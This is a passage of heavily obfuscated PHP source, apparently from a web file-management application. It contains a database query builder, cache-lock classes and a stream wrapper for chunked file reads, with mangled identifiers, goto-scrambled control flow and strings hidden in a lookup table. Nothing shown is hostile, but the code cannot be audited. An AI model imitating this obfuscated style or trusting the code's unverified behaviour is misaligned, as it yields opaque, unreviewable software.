=& $_SERVER[Å¸ş]; return !empty($eÛ§ÅìÚ°) ? $eïçÛ Ê«é[947] : $eïçÛ Ê«é[33]; } protected function parseUnion($A§¿Í¥£«) { $d®óÔ‚½¹ë =& $_SERVER[Å¸ş]; if (empty($A§¿Í¥£«)) { return $d®óÔ‚½¹ë[33]; } if (isset($A§¿Í¥£«[$d®óÔ‚½¹ë[336]])) { $cøÊ¯Š‡‡Ù = $d®óÔ‚½¹ë[948]; unset($A§¿Í¥£«[$d®óÔ‚½¹ë[336]]); } else { $cøÊ¯Š‡‡Ù = $d®óÔ‚½¹ë[949]; } foreach ($A§¿Í¥£« as $Dê§‹÷ì®Ñ) { $d„¦ƒ‰ËÛ¥[] = $cøÊ¯Š‡‡Ù . (is_array($Dê§‹÷ì®Ñ) ? $this->buildSelectSql($Dê§‹÷ì®Ñ) : $Dê§‹÷ì®Ñ); } return implode($d®óÔ‚½¹ë[50], $d„¦ƒ‰ËÛ¥); } public function insert($EåÅä—‡Ö´, $a°ÛËÂ¾ìŸ = array(), $AøãÒ¢›ªë = false) { goto FÌÏ‹ÙÙÙ; FÌÏ‹ÙÙÙ: $d…øåËÜ =& $_SERVER[Å¸ş]; $DÓÅÚÀë‹ö = $Açø‰¦ØŞ = array(); $this->model = $a°ÛËÂ¾ìŸ[$d…øåËÜ[269]]; goto f³¦‚¦­×; f³¦‚¦­×: foreach ($EåÅä—‡Ö´ as $aÁëñ‡º¹ => $bÌÑïİ¥Ç§) { if (is_array($bÌÑïİ¥Ç§) && $d…øåËÜ[285] == $bÌÑïİ¥Ç§[0]) { $Açø‰¦ØŞ[] = $this->parseKey($aÁëñ‡º¹); $DÓÅÚÀë‹ö[] = $bÌÑïİ¥Ç§[1]; } elseif (is_scalar($bÌÑïİ¥Ç§) || is_null($bÌÑïİ¥Ç§)) { $Açø‰¦ØŞ[] = $this->parseKey($aÁëñ‡º¹); $DÓÅÚÀë‹ö[] = $this->parseValue($bÌÑïİ¥Ç§); } } $fëæ»Ïß  = ($AøãÒ¢›ªë ? $d…øåËÜ[816] : $d…øåËÜ[817]) . $d…øåËÜ[818] . $this->parseTable($a°ÛËÂ¾ìŸ[$d…øåËÜ[267]]) . $d…øåËÜ[812] . implode($d…øåËÜ[47], $Açø‰¦ØŞ) . $d…øåËÜ[813] . implode($d…øåËÜ[47], $DÓÅÚÀë‹ö) . $d…øåËÜ[814]; $fëæ»Ïß  .= $this->parseLock(isset($a°ÛËÂ¾ìŸ[$d…øåËÜ[774]]) ? $a°ÛËÂ¾ìŸ[$d…øåËÜ[774]] : !1); goto Dä£Èô—â¦; Dä£Èô—â¦: $fëæ»Ïß  .= $this->parseComment(!empty($a°ÛËÂ¾ìŸ[$d…øåËÜ[341]]) ? $a°ÛËÂ¾ìŸ[$d…øåËÜ[341]] : $d…øåËÜ[33]); return $this->execute($fëæ»Ïß , $this->parseBind(!empty($a°ÛËÂ¾ìŸ[$d…øåËÜ[273]]) ? $a°ÛËÂ¾ìŸ[$d…øåËÜ[273]] : array())); goto BîöØÎ„®; BîöØÎ„®: } public function selectInsert($CÖ…Û¦Ş¯×, $dªİ²Ñù‚æ, $dîœ™šËèÖ = array()) { goto aÀç–·êäö; aÀç–·êäö: $B¯–×»æ‚ =& $_SERVER[Å¸ş]; $this->model = $dîœ™šËèÖ[$B¯–×»æ‚[269]]; if (is_string($CÖ…Û¦Ş¯×)) { $CÖ…Û¦Ş¯× = explode($B¯–×»æ‚[47], $CÖ…Û¦Ş¯×); } goto DÆ«¨¤öìø; DÆ«¨¤öìø: array_walk($CÖ…Û¦Ş¯×, array($this, $B¯–×»æ‚[815])); $FÆáÌçµÚ® = $B¯–×»æ‚[950] . $this->parseTable($dªİ²Ñù‚æ) . $B¯–×»æ‚[812] . implode($B¯–×»æ‚[47], $CÖ…Û¦Ş¯×) . $B¯–×»æ‚[929]; $FÆáÌçµÚ® .= $this->buildSelectSql($dîœ™šËèÖ); goto fÜßö˜ßÏé; fÜßö˜ßÏé: return $this->execute($FÆáÌçµÚ®, $this->parseBind(!empty($dîœ™šËèÖ[$B¯–×»æ‚[273]]) ? $dîœ™šËèÖ[$B¯–×»æ‚[273]] : array())); goto cÂëñŠƒ¡; cÂëñŠƒ¡: } public function update($dªÉ³äÀŠÁ, $Fî¦•²Û ) { $Dêµ½ÈÇ‘Å =& $_SERVER[Å¸ş]; $this->model = $Fî¦•²Û [$Dêµ½ÈÇ‘Å[269]]; $Eğò¿¸¦ßß = $Dêµ½ÈÇ‘Å[951] . $this->parseTable($Fî¦•²Û [$Dêµ½ÈÇ‘Å[267]]) . $this->parseSet($dªÉ³äÀŠÁ) . $this->parseWhere(!empty($Fî¦•²Û [$Dêµ½ÈÇ‘Å[263]]) ? $Fî¦•²Û [$Dêµ½ÈÇ‘Å[263]] : $Dêµ½ÈÇ‘Å[33]) . $this->parseOrder(!empty($Fî¦•²Û [$Dêµ½ÈÇ‘Å[350]]) ? $Fî¦•²Û [$Dêµ½ÈÇ‘Å[350]] : $Dêµ½ÈÇ‘Å[33]) . $this->parseLimit(!empty($Fî¦•²Û [$Dêµ½ÈÇ‘Å[280]]) ? $Fî¦•²Û [$Dêµ½ÈÇ‘Å[280]] : $Dêµ½ÈÇ‘Å[33]) . $this->parseLock(isset($Fî¦•²Û [$Dêµ½ÈÇ‘Å[774]]) ? $Fî¦•²Û [$Dêµ½ÈÇ‘Å[774]] : !1) . $this->parseComment(!empty($Fî¦•²Û [$Dêµ½ÈÇ‘Å[341]]) ? $Fî¦•²Û [$Dêµ½ÈÇ‘Å[341]] : $Dêµ½ÈÇ‘Å[33]); return $this->execute($Eğò¿¸¦ßß, $this->parseBind(!empty($Fî¦•²Û [$Dêµ½ÈÇ‘Å[273]]) ? $Fî¦•²Û [$Dêµ½ÈÇ‘Å[273]] : array())); } public function delete($e—ÏÊ„­¯ = array()) { $e´Â­ù»‹Ÿ =& $_SERVER[Å¸ş]; $this->model = $e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[269]]; $E½¢³‰„›Í = $e´Â­ù»‹Ÿ[952] . $this->parseTable($e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[267]]) . $this->parseWhere(!empty($e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[263]]) ? $e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[263]] : $e´Â­ù»‹Ÿ[33]) . $this->parseOrder(!empty($e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[350]]) ? $e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[350]] : $e´Â­ù»‹Ÿ[33]) . $this->parseLimit(!empty($e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[280]]) ? $e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[280]] : $e´Â­ù»‹Ÿ[33]) . $this->parseLock(isset($e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[774]]) ? $e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[774]] : !1) . $this->parseComment(!empty($e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[341]]) ? $e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[341]] : $e´Â­ù»‹Ÿ[33]); return $this->execute($E½¢³‰„›Í, $this->parseBind(!empty($e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[273]]) ? $e—ÏÊ„­¯[$e´Â­ù»‹Ÿ[273]] : array())); } public function select($C‚Å¤ì—è = array()) { goto aÄÆöïœ¡«; fó¯ƒ´¢É”: if ($aº¦ˆ‰Ã…¥ && !1 !== $aƒ·ó­Ä£Â) { think_cache($B—ì³Ğ¦°ä, $aƒ·ó­Ä£Â, $aº¦ˆ‰Ã…¥); } return $aƒ·ó­Ä£Â; goto dÖŸ…­×‹Ü; D˜á¨Øºò: $aº¦ˆ‰Ã…¥ = isset($C‚Å¤ì—è[$F¯‘šìÅ[337]]) ? $C‚Å¤ì—è[$F¯‘šìÅ[337]] : !1; if ($aº¦ˆ‰Ã…¥) { $B—ì³Ğ¦°ä = is_string($aº¦ˆ‰Ã…¥[$F¯‘šìÅ[89]]) ? $aº¦ˆ‰Ã…¥[$F¯‘šìÅ[89]] : $F¯‘šìÅ[953] . md5($Fœ• Ôáñ ); $Aå„ë×˜Ö‡ = think_cache($B—ì³Ğ¦°ä, $F¯‘šìÅ[33], $aº¦ˆ‰Ã…¥); if (!1 !== $Aå„ë×˜Ö‡) { return $Aå„ë×˜Ö‡; } } $aƒ·ó­Ä£Â = $this->query($Fœ• Ôáñ , $this->parseBind(!empty($C‚Å¤ì—è[$F¯‘šìÅ[273]]) ? $C‚Å¤ì—è[$F¯‘šìÅ[273]] : array())); goto fó¯ƒ´¢É”; aÄÆöïœ¡«: $F¯‘šìÅ =& $_SERVER[Å¸ş]; $this->model = $C‚Å¤ì—è[$F¯‘šìÅ[269]]; $Fœ• Ôáñ  = $this->buildSelectSql($C‚Å¤ì—è); goto D˜á¨Øºò; dÖŸ…­×‹Ü: } public function buildSelectSql($d¡·Ñäó¿¨ = array()) { goto b§·Ğò‹; b§·Ğò‹: $d§…ğ²»©Á =& $_SERVER[Å¸ş]; if (isset($d¡·Ñäó¿¨[$d§…ğ²»©Á[340]])) { if (strpos($d¡·Ñäó¿¨[$d§…ğ²»©Á[340]], $d§…ğ²»©Á[47])) { list($AòßÙİ”¢, $CóîÃ‚¡®ñ) = explode($d§…ğ²»©Á[47], $d¡·Ñäó¿¨[$d§…ğ²»©Á[340]]); } else { $AòßÙİ”¢ = $d¡·Ñäó¿¨[$d§…ğ²»©Á[340]]; } $AòßÙİ”¢ = $AòßÙİ”¢ ? $AòßÙİ”¢ : 1; $CóîÃ‚¡®ñ = isset($CóîÃ‚¡®ñ) ? $CóîÃ‚¡®ñ : (is_numeric($d¡·Ñäó¿¨[$d§…ğ²»©Á[280]]) ? $d¡·Ñäó¿¨[$d§…ğ²»©Á[280]] : 20); $Dîª¥‚Ê–» = $CóîÃ‚¡®ñ * ((int) $AòßÙİ”¢ - 1); $d¡·Ñäó¿¨[$d§…ğ²»©Á[280]] = $Dîª¥‚Ê–» . $d§…ğ²»©Á[47] . $CóîÃ‚¡®ñ; } if (think_config($d§…ğ²»©Á[954])) { $EßàòÌ = $d§…ğ²»©Á[955] . md5(serialize($d¡·Ñäó¿¨)); $a‚Ïˆ¢óòë = think_cache($EßàòÌ); if ($a‚Ïˆ¢óòë) { return $a‚Ïˆ¢óòë; } } goto Cî¯³¿Â¦; Cî¯³¿Â¦: $d‘ËÎî“Ä¯ = $this->parseSql($this->selectSql, $d¡·Ñäó¿¨); $d‘ËÎî“Ä¯ .= $this->parseLock(isset($d¡·Ñäó¿¨[$d§…ğ²»©Á[774]]) ? $d¡·Ñäó¿¨[$d§…ğ²»©Á[774]] : !1); if (isset($EßàòÌ)) { think_cache($EßàòÌ, $d‘ËÎî“Ä¯); } goto b–‹›¿ÑÂ; b–‹›¿ÑÂ: return $d‘ËÎî“Ä¯; goto a¥…öÏ“ÒÃ; a¥…öÏ“ÒÃ: } public function parseSql($f…ŒÄÍ‚’…, $BÛ“–Â­ = array()) { $fÜÜêÙ¢  =& $_SERVER[Å¸ş]; $f…ŒÄÍ‚’… = str_replace(array($fÜÜêÙ¢ [956], $fÜÜêÙ¢ [957], $fÜÜêÙ¢ [958], $fÜÜêÙ¢ [959], $fÜÜêÙ¢ [960], $fÜÜêÙ¢ [961], $fÜÜêÙ¢ [962], $fÜÜêÙ¢ [963], $fÜÜêÙ¢ [964], $fÜÜêÙ¢ [965], $fÜÜêÙ¢ [966]), array($this->parseTable("{$BÛ“–Â­[$fÜÜêÙ¢ [267]]}"), $this->parseDistinct(isset($BÛ“–Â­[$fÜÜêÙ¢ [967]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [967]] : !1), $this->parseField(!empty($BÛ“–Â­[$fÜÜêÙ¢ [261]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [261]] : $fÜÜêÙ¢ [176]), $this->parseJoin(!empty($BÛ“–Â­[$fÜÜêÙ¢ [270]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [270]] : $fÜÜêÙ¢ [33]), $this->parseWhere(!empty($BÛ“–Â­[$fÜÜêÙ¢ [263]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [263]] : $fÜÜêÙ¢ [33]), $this->parseGroup(!empty($BÛ“–Â­[$fÜÜêÙ¢ [968]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [968]] : $fÜÜêÙ¢ [33]), $this->parseHaving(!empty($BÛ“–Â­[$fÜÜêÙ¢ [969]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [969]] : $fÜÜêÙ¢ [33]), $this->parseOrder(!empty($BÛ“–Â­[$fÜÜêÙ¢ [350]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [350]] : $fÜÜêÙ¢ [33]), $this->parseLimit(!empty($BÛ“–Â­[$fÜÜêÙ¢ [280]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [280]] : $fÜÜêÙ¢ [33]), $this->parseUnion(!empty($BÛ“–Â­[$fÜÜêÙ¢ [335]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [335]] : $fÜÜêÙ¢ [33]), $this->parseComment(!empty($BÛ“–Â­[$fÜÜêÙ¢ [341]]) ? $BÛ“–Â­[$fÜÜêÙ¢ [341]] : $fÜÜêÙ¢ [33])), $f…ŒÄÍ‚’…); return $f…ŒÄÍ‚’…; } public function getLastSql($a–…ˆ›İ×æ = '') { return $a–…ˆ›İ×æ ? $this->modelSql[$a–…ˆ›İ×æ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($eƒ¹„îä¦ô) { return addslashes($eƒ¹„îä¦ô); } public function setModel($e‘Íš’œ£ˆ) { $this->model = $e‘Íš’œ£ˆ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } goto fÎ›é™”íÌ; c¡¼ï×Ã¾²: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { goto aË£Á·ø¹¡; CÍˆ²àˆÀ‰: if ($b„Øö×—é == $e´Ù“ÆÖƒæ[17] && $dÉà³ëŠå == $e´Ù“ÆÖƒæ[9]) { $b„Øö×—é = $e´Ù“ÆÖƒæ[167]; } switch ($b„Øö×—é) { case $e´Ù“ÆÖƒæ[760]: self::$handle = new CacheLockRedis(); break; case $e´Ù“ÆÖƒæ[761]: self::$handle = new CacheLockMemcached(); break; case $e´Ù“ÆÖƒæ[17]: self::$handle = new CacheLockDatabase(); break; case $e´Ù“ÆÖƒæ[167]: self::$handle = new CacheLockFile(); break; default: break; } return self::$handle; goto FÑµ‰å¤·Å; dÜØÃ²†ÌÒ: self::$timeout = $Aº‚ë÷Ñé‚[$e´Ù“ÆÖƒæ[770]] ? $Aº‚ë÷Ñé‚[$e´Ù“ÆÖƒæ[770]] : 10; $dÉà³ëŠå = _get($GLOBALS[$e´Ù“ÆÖƒæ[6]], $e´Ù“ÆÖƒæ[771]); $b„Øö×—é = $Aº‚ë÷Ñé‚[$e´Ù“ÆÖƒæ[757]] ? $Aº‚ë÷Ñé‚[$e´Ù“ÆÖƒæ[757]] : $e´Ù“ÆÖƒæ[167]; goto CÍˆ²àˆÀ‰; aË£Á·ø¹¡: $e´Ù“ÆÖƒæ =& $_SERVER[Å¸ş]; if (self::$handle) { return self::$handle; } $Aº‚ë÷Ñé‚ = $GLOBALS[$e´Ù“ÆÖƒæ[6]][$e´Ù“ÆÖƒæ[337]]; goto dÜØÃ²†ÌÒ; FÑµ‰å¤·Å: } private static function key($cÆÑ®÷ƒÂ) { return $_SERVER[Å¸ş][772] . Cache::key($cÆÑ®÷ƒÂ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($F¶â¼ˆë… = '') { self::$errorMsg = $F¶â¼ˆë…; } public static function lockGlobal($Cˆ™«¥Öì, $Fñ¤Êœ¼) { return self::lock($Cˆ™«¥Öì, $Fñ¤Êœ¼, !0); } public static function lock($fğÕ‹ƒéÑ, $CÇÇ‹ ¸  = false, $A½ã¶áÉ¬› = false) { goto d„‰ãÜå‚’; Aêê›…˜: if (!$A½ã¶áÉ¬›) { self::$lockItem[$Eà˜ÖíÀù¢] = !0; } return $fíè»£ğˆĞ; goto CÁ³Ûº»Ğ; c‚¾Éªâºô: $CÇÇ‹ ¸  = $CÇÇ‹ ¸  ? $CÇÇ‹ ¸  : self::$timeout; $fíè»£ğˆĞ = $Eîõäå“àœ->lock($Eà˜ÖíÀù¢, $CÇÇ‹ ¸ ); if (!$fíè»£ğˆĞ) { $B®İƒÊ·ƒÜ = $AÚÍ¤®—ÀÛ[773] . $CÇÇ‹ ¸  . $AÚÍ¤®—ÀÛ[67] . self::$errorMsg . $AÚÍ¤®—ÀÛ[67] . get_caller_msg(); $A÷‰óå˜‰Ï = "\114\157\x63\x6b\40\141\143\164\x69\157\156\x3a\40{$Eà˜ÖíÀù¢}\40\x74\151\x6d\145\x6f\x75\x74\x2c\x6f\x76\x65\x72\40{$CÇÇ‹ ¸ }\x20\x73"; $A÷‰óå˜‰Ï = self::$errorMsg ? self::$errorMsg : $dòÜ‹¸•­; write_log($B®İƒÊ·ƒÜ, $AÚÍ¤®—ÀÛ[774]); show_json($A÷‰óå˜‰Ï, !1); } goto Aêê›…˜; d„‰ãÜå‚’: $AÚÍ¤®—ÀÛ =& $_SERVER[Å¸ş]; $Eîõäå“àœ = self::init(); $Eà˜ÖíÀù¢ = self::key($fğÕ‹ƒéÑ); goto c‚¾Éªâºô; CÁ³Ûº»Ğ: } public static function lockGet($BÅÙ†…¦ßâ) { $c°æ˜ÀÀôÚ = self::key($BÅÙ†…¦ßâ); if (self::$lockItem[$c°æ˜ÀÀôÚ]) { return self::$lockItem[$c°æ˜ÀÀôÚ]; } return self::init()->lockGet($c°æ˜ÀÀôÚ); } public static function unlock($FÉ ÚªˆÈì) { $aøˆŠ´·§ = self::key($FÉ ÚªˆÈì); self::$lockItem[$aøˆŠ´·§] = null; return self::init()->unlock($aøˆŠ´·§); } public static function unlockRuntime() { $DÎó’Ñó‹­ =& $_SERVER[Å¸ş]; $fÖ”–Œ¨ˆ = self::init(); $cŒÂâŞì‹¦ = !1; foreach (self::$lockItem as $c¡ğğÜ¦¼ƒ => $CãÈíÁ”‡õ) { if (!$CãÈíÁ”‡õ) { continue; } $fÖ”–Œ¨ˆ->unlock($c¡ğğÜ¦¼ƒ); if (!$cŒÂâŞì‹¦) { $cŒÂâŞì‹¦ = !0; write_log($DÎó’Ñó‹­[775] . $c¡ğğÜ¦¼ƒ . $DÎó’Ñó‹­[67] . get_caller_msg(), $DÎó’Ñó‹­[774]); continue; } write_log($DÎó’Ñó‹­[775] . $c¡ğğÜ¦¼ƒ, $DÎó’Ñó‹­[774]); } } } function cacheLockWait() { usleep(mt_rand(5, 50) * 100); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $Cƒ×¤£ï—­ =& $_SERVER[Å¸ş]; $cİÂŠĞƒ˜İ = $GLOBALS[$Cƒ×¤£ï—­[6]][$Cƒ×¤£ï—­[337]]; self::$cachePath = $cİÂŠĞƒ˜İ[$Cƒ×¤£ï—­[167]][$Cƒ×¤£ï—­[75]]; @mkdir(self::$cachePath, 511, !0); } public function lock($bçéÅâôÔ, $D¯ô©Ë¥° = 0) { goto eÛÌğ™Ûà; eÛÌğ™Ûà: $DÜĞô¯•Ø =& $_SERVER[Å¸ş]; $eË¾ÜµÒÓƒ = microtime(!0); $Bæ‚ÊßéìÜ = $eË¾ÜµÒÓƒ + $D¯ô©Ë¥° + 0.0001; goto Fì§ŠÔ•çŠ; Fì§ŠÔ•çŠ: $c±öÛ†ˆ¬ = rtrim(self::$cachePath, $DÜĞô¯•Ø[8]) . $DÜĞô¯•Ø[776] . md5($bçéÅâôÔ) . $DÜĞô¯•Ø[777]; if (file_exists($c±öÛ†ˆ¬) && filemtime($c±öÛ†ˆ¬) && filemtime($c±öÛ†ˆ¬) < time() - 10) { @unlink($c±öÛ†ˆ¬); } do { if (file_exists($c±öÛ†ˆ¬)) { cacheLockWait(); continue; } $Dç¤ÄÖïòŒ = fopen($c±öÛ†ˆ¬, $DÜĞô¯•Ø[778]); if (!$Dç¤ÄÖïòŒ) { return !1; } $ağĞ™»ÍÏ = flock($Dç¤ÄÖïòŒ, LOCK_EX | LOCK_NB); self::$caches[$bçéÅâôÔ] = array($DÜĞô¯•Ø[779] => $Dç¤ÄÖïòŒ, $DÜĞô¯•Ø[167] => $c±öÛ†ˆ¬); fwrite($Dç¤ÄÖïòŒ, $Bæ‚ÊßéìÜ); clearstatcache(); if ($Dç¤ÄÖïòŒ && $ağĞ™»ÍÏ) { return !0; } cacheLockWait(); } while (microtime(!0) < $Bæ‚ÊßéìÜ); goto DµÇ„Î¡¡†; DµÇ„Î¡¡†: $this->unlock($bçéÅâôÔ); return !1; goto dÒš’‹”Ñ; dÒš’‹”Ñ: } public function lockGet($AçºšÔáÊ†) { $e—ºáªŒ­ =& $_SERVER[Å¸ş]; $BĞ²†×Ü×ö = rtrim(self::$cachePath, $e—ºáªŒ­[8]) . $e—ºáªŒ­[776] . md5($AçºšÔáÊ†) . $e—ºáªŒ­[777]; return file_exists($BĞ²†×Ü×ö); } public function unlock($bÂÄˆáù˜‘) { goto AÒß”§£öÓ; AÒß”§£öÓ: $AÀªè³›±œ =& $_SERVER[Å¸ş]; $Féë‰÷°Â = self::$caches[$bÂÄˆáù˜‘]; if (!$Féë‰÷°Â) { return; } goto EÆÌòœÎ®Š; BÔ‚˜“ÚÃ: unset(self::$caches[$bÂÄˆáù˜‘]); goto C»´Œ¬¸Â; EÆÌòœÎ®Š: @flock($Féë‰÷°Â[$AÀªè³›±œ[779]], LOCK_UN); @fclose($Féë‰÷°Â[$AÀªè³›±œ[779]]); @unlink($Féë‰÷°Â[$AÀªè³›±œ[167]]); goto BÔ‚˜“ÚÃ; C»´Œ¬¸Â: } } goto E²ƒ“ÉÖó†; A½°‘Åí‘: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($dİ¿‹º½é, $BÚ¾˜ŞÑêÁ = '') { goto döòß‘ô‰; dà¢ô¬Ó: return $this->info ? !0 : !1; goto EîáŒ“ŠÁÂ; AÇ¨‹¤›Ì‰: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$dİ¿‹º½é])) { self::$_chunkBuffer[$dİ¿‹º½é] = array(); } goto dà¢ô¬Ó; döòß‘ô‰: $this->info = $this->info($dİ¿‹º½é); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[Å¸ş][75]]; goto AÇ¨‹¤›Ì‰; EîáŒ“ŠÁÂ: } function stream_read($c‘Ï‰òÊÃä) { $c»…“äÒ¢­ = $this->fileSubstr($this->pose, $c‘Ï‰òÊÃä); $this->pose += strlen($c»…“äÒ¢­); return $c»…“äÒ¢­; } public function stream_tell() { return $this->pose; } public function stream_seek($dØÍ…ìœõó, $bš¬®ñ›í–) { $dƒ¾°†¥µ­ =& $_SERVER[Å¸ş]; if ($bš¬®ñ›í– == SEEK_SET) { $this->pose = $dØÍ…ìœõó; } else { if ($bš¬®ñ›í– == SEEK_CUR) { $this->pose += $dØÍ…ìœõó; } else { if ($bš¬®ñ›í– == SEEK_END) { $this->pose = $this->info[$dƒ¾°†¥µ­[77]] + intval($dØÍ…ìœõó); } } } if ($dØÍ…ìœõó < 0) { $this->pose = $this->info[$dƒ¾°†¥µ­[77]] + $dØÍ…ìœõó; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[Å¸ş][77]]; } public function stream_close() { return !0; } public function url_stat($AÀŒ¸Œ¶£†, $Dï¬÷éÒÓ’) { $bà˜¿‡„ÁÎ =& $_SERVER[Å¸ş]; $CËËÊëÕÌ = $this->info($AÀŒ¸Œ¶£†); return array($bà˜¿‡„ÁÎ[1288] => 0, $bà˜¿‡„ÁÎ[1289] => 0, $bà˜¿‡„ÁÎ[12] => 32768 + 511, $bà˜¿‡„ÁÎ[1290] => 0, $bà˜¿‡„ÁÎ[1291] => 0, $bà˜¿‡„ÁÎ[1292] => 0, $bà˜¿‡„ÁÎ[1293] => 0, $bà˜¿‡„ÁÎ[77] => $CËËÊëÕÌ[$bà˜¿‡„ÁÎ[77]], $bà˜¿‡„ÁÎ[1294] => $CËËÊëÕÌ[$bà˜¿‡„ÁÎ[1166]], $bà˜¿‡„ÁÎ[1252] => $CËËÊëÕÌ[$bà˜¿‡„ÁÎ[107]], $bà˜¿‡„ÁÎ[1251] => $CËËÊëÕÌ[$bà˜¿‡„ÁÎ[187]], $bà˜¿‡„ÁÎ[1295] => 0, $bà˜¿‡„ÁÎ[1296] => 0); } static $fileInfo = array(); public function info($E›£‚»¬ßñ) { $fÌ¶ÚÈ£ï = $_SERVER[Å¸ş][1297]; if (isset(self::$fileInfo[$E›£‚»¬ßñ])) { return self::$fileInfo[$E›£‚»¬ßñ]; } if (substr($E›£‚»¬ßñ, 0, strlen($fÌ¶ÚÈ£ï)) != $fÌ¶ÚÈ£ï) { return !1; } self::$fileInfo[$E›£‚»¬ßñ] = IO::info(substr($E›£‚»¬ßñ, strlen($fÌ¶ÚÈ£ï))); return self::$fileInfo[$E›£‚»¬ßñ]; } public static function read($CÒØ›ãƒ•™, $B½‚¶ëØÈ, $d¡œˆÃ“£) { goto c‡¬®»ï; DâøÚ‚Ş˜÷: $fÎ‡Êç×ì’ = 0; while ($fÎ‡Êç×ì’ < $d¡œˆÃ“£) { $DŸ¥Âğ­Ãè = min($Eï°­‡ÀÃé, $d¡œˆÃ“£ - $fÎ‡Êç×ì’); $d¸©º¯©âÕ .= fread($b¾ĞªÌ°–, $DŸ¥Âğ­Ãè); $fÎ‡Êç×ì’ += $DŸ¥Âğ­Ãè; } fclose($b¾ĞªÌ°–); goto Dò ­¹×–; c‡¬®»ï: $d•Öò÷™‡· =& $_SERVER[Å¸ş]; $b¾ĞªÌ°– = fopen($CÒØ›ãƒ•™, $d•Öò÷™‡·[1168]); if (!$b¾ĞªÌ°–) { return $d•Öò÷™‡·[33]; } goto C”¢ÁŒ˜ÕŠ; C”¢ÁŒ˜ÕŠ: $Eï°­‡ÀÃé = 8192; fseek($b¾ĞªÌ°–, $B½‚¶ëØÈ, SEEK_SET); $d¸©º¯©âÕ = $d•Öò÷™‡·[33]; goto DâøÚ‚Ş˜÷; Dò ­¹×–: return $d¸©º¯©âÕ; goto b¯›˜åÊÇ; b¯›˜åÊÇ: } public function fileSubstr($a£Îõ‰•ô, $EõñÛ‘ê¡) { goto AõÀ¨­ğß°; BÈğ®ÅÇ„ï: $e‡’ù¦ùÕ£ = ceil(($a£Îõ‰•ô + $EõñÛ‘ê¡) / $a¬‚£ƒ’áÒ) * $a¬‚£ƒ’áÒ - $a©›³‡Ãçß; $cöòâ¤ó° = IO::fileSubstr($this->path, $a©›³‡Ãçß, $e‡’ù¦ùÕ£); $Dİ˜ñæ¹Ì‰[$a©›³‡Ãçß . $b¸öƒáËÀˆ[33]] = $cöòâ¤ó°; goto A¹ˆ”›ãêœ; bÍÙŞà‡¨: if ($a£Îõ‰•ô + $EõñÛ‘ê¡ > $e¡ùèÅßĞ) { $EõñÛ‘ê¡ = $e¡ùèÅßĞ - $a£Îõ‰•ô; } if ($EõñÛ‘ê¡ <= 0) { return $b¸öƒáËÀˆ[33]; } if ($a£Îõ‰•ô < 0 || $a£Îõ‰•ô >= $e¡ùèÅßĞ || $EõñÛ‘ê¡ <= 0 || $EõñÛ‘ê¡ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\x69\154\x65\122\145\141\144\40\x65\x72\162\x6f\x72\41\x20\163\x74\x61\x72\x74\75{$a£Îõ‰•ô}\73\x6c\145\156\147\x74\x68\75{$EõñÛ‘ê¡}\73\x20\x73\x69\172\x65\x3d{$e¡ùèÅßĞ}\x3b"); } goto Dİ÷Àï–¬Í; AõÀ¨­ğß°: $b¸öƒáËÀˆ =& $_SERVER[Å¸ş]; $e¡ùèÅßĞ = $this->info[$b¸öƒáËÀˆ[77]]; $DÅÒ–è–• = $a£Îõ‰•ô; goto A÷÷ØµÚ²; Eã†ˆËí: $fÔ¸Ø¼šÔä = 0; $D’ƒŠİØÂ¢ = 0; $cõæŠó™ˆ• = $b¸öƒáËÀˆ[33]; goto aƒÎ¡ÈìÚ; A¹ˆ”›ãêœ: ksort($Dİ˜ñæ¹Ì‰); $Cãõ­ÙƒÒ = substr($cöòâ¤ó°, $a£Îõ‰•ô - $a©›³‡Ãçß, $EõñÛ‘ê¡); return $Cãõ­ÙƒÒ; goto Cä…¹©¼ª; A÷÷ØµÚ²: $cÔÓ ñ¾’ã = $EõñÛ‘ê¡; if ($a£Îõ‰•ô < 0) { $a£Îõ‰•ô = $e¡ùèÅßĞ + $a£Îõ‰•ô; } if ($EõñÛ‘ê¡ === !1) { $EõñÛ‘ê¡ = $e¡ùèÅßĞ - $a£Îõ‰•ô; } goto bÍÙŞà‡¨; Dİ÷Àï–¬Í: $a¬‚£ƒ’áÒ = 64 * 1024; $Dİ˜ñæ¹Ì‰ =& self::$_chunkBuffer[$this->path]; if (!$Dİ˜ñæ¹Ì‰) { $Dİ˜ñæ¹Ì‰ = array(); } goto Eã†ˆËí; aƒÎ¡ÈìÚ: foreach ($Dİ˜ñæ¹Ì‰ as $fÔ¸Ø¼šÔä => $cõæŠó™ˆ•) { $fÔ¸Ø¼šÔä = intval($fÔ¸Ø¼šÔä); $D’ƒŠİØÂ¢ = $fÔ¸Ø¼šÔä + 